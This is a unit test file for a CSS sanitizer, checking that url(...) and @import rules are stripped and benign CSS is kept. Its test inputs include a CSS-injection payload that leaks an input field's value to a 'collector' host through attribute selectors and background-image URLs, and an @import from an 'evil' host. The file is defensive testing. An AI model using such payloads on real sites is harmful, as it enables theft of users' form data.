import { describe, it, expect } from "vitest";
import { sanitizeCss } from "../src/sanitize.js";

describe("sanitizeCss", () => {
  it("strips url(...) so the background-image channel is dead", () => {
    const dirty = 'input[value^="a"]{background-image:url(http://collector:4000/leak?c=a)}';
    const clean = sanitizeCss(dirty);
    expect(clean).not.toContain("url(");
    expect(clean).not.toContain("collector");
    expect(clean).toContain('input[value^="a"]');
  });

  it("strips @import at-rules", () => {
    const clean = sanitizeCss('@import url("http://evil/x.css"); body{color:red}');
    expect(clean).not.toContain("@import");
    expect(clean).not.toContain("url(");
    expect(clean).toContain("body{color:red}");
  });

  it("leaves benign CSS untouched", () => {
    const css = "body{color:red;font-size:14px}";
    expect(sanitizeCss(css)).toBe(css);
  });
});
